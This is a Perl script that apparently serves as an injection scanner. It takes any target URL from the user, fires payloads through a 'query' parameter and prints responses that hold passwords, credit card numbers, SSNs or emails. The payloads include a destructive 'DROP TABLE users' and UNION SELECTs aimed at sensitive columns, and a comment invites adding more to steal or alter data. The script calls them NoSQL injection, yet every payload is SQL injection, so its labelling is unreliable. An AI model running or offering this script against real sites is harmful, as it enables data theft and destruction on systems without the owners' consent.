use strict;
use warnings;
use LWP::UserAgent;
use Term::ANSIColor;

# Function to send HTTP request and receive response
sub send_request {
    my ($url) = @_;
    my $ua = LWP::UserAgent->new;
    my $response = $ua->get($url);
    return $response;
}

# Function to test for NoSQL injection vulnerability
sub test_vulnerability {
    my ($url) = @_;

    print "Testing for NoSQL Injection vulnerability...\n";

    # Payloads for testing NoSQL injection
    my @payloads = (
        "' or 1=1--",
        "' or '1'='1",
        "'; DROP TABLE users--",
        "' UNION SELECT * FROM users--",
        "' UNION SELECT password FROM users--",
        "' UNION SELECT credit_card FROM users--",
        "' UNION SELECT ssn FROM users--",
        "' UNION SELECT email FROM users--",
        "' UNION SELECT * FROM information_schema.tables--",
        "' UNION SELECT * FROM information_schema.columns--",
        "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--",
        # Add more payloads here to collect sensitive information or manipulate the database
    );

    foreach my $payload (@payloads) {
        my $test_url = $url . "?query=" . $payload;
        print "Testing payload: $payload\n";
        my $response = send_request($test_url);
        my $content = $response->decoded_content;
        
        # Check if sensitive information is present in the response content
        if ($content =~ /password|credit_card|ssn|email/i) {
            print color('bold red'), "Potential sensitive information found in response:\n", color('reset'), $content;
        }
        
        # Check if the response indicates a successful injection
        if ($content =~ /login_successful|welcome_back/i) {
            print color('bold green'), "Vulnerability Found! NoSQL Injection is possible with payload: $payload\n", color('reset');
            return 1;
        }
    }

    print color('bold red'), "No vulnerability found.\n", color('reset');
    return 0;
}

# Main program
print "Enter your target website URL: ";
my $target_url = <STDIN>;
chomp $target_url;

my $vulnerability_found = test_vulnerability($target_url);

if ($vulnerability_found) {
    print "To test this vulnerability, try to manipulate the 'query' parameter with different payloads to see if you can bypass authentication or access unauthorized data.\n";
} else {
    print "The website doesn't seem to be vulnerable to NoSQL Injection.\n";
}
